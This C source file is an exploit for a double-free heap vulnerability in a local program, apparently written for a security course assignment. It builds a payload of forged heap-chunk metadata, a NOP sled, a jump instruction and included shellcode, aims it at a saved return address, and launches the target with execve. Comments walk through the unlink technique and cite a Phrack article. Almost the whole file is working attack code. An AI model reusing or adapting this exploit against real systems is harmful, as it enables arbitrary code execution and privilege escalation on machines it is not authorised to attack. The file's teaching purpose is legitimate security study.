#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"
#define MEM_START_OFFSET 392
#define NOP                            0x90

// references consulted:
// Once upon a free:
// http://www.phrack.com/issues.html?issue=57&id=9&mode=txt


static char attack[] =
  "\xbb\xbb\xbb\xbb" // Nothing, just an identifier
  "\xff\xff\xff\xff" // Again, this is just to help the human
  "\x60\x9d\x04\x08" // p->s.l = the address to jump to.  Note p->s.l
                     // is q
  "\x5c\xfa\xff\xbf" // the address of saved EIP
;

/* Ok, so there is a tricky condition to meet.  The free bit of q
   must be set, which means it must be one.  Then, the tfree code
   clears and resets this.  So, we need an instruction whose last bit
   is one: eb0c, which will jump ahead 12 bytes.  And I'm an 80s
   music fan.  Music was just better back then...*/
static char vh_jump[] = "\xeb\x0c\x90\x90\xff\xff\xff\xff";

int main(void)
{
  char *args[3];
  char *env[1];

  char *buff, *ptr;

  long * addr_ptr;

  int bsize = 1024;

  if (!(buff = malloc(bsize)))
    exit(1);

  // init the buffer to NOPs
  memset(buff, NOP, bsize);

  // The offset is where the double free occurs, so let's start
  // putting our attach there
  ptr = buff + MEM_START_OFFSET;
  memcpy(ptr, attack, strlen(attack));

  // After the attack, but the jump code to jump (JUMP!) ahead a few NOPs
  ptr = ptr + strlen(attack);
  memcpy(ptr, vh_jump, strlen(vh_jump));

  // The jmp is for 12, but put the shell code a nice word aligned
  // amount away
  ptr = ptr + strlen(vh_jump) + 16;
  memcpy(ptr, shellcode, strlen(shellcode));

  buff[bsize - 1] = '\0';

  // Args
  args[0] = TARGET;
  args[1] = buff;
  args[2] = NULL;

  // Environment
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
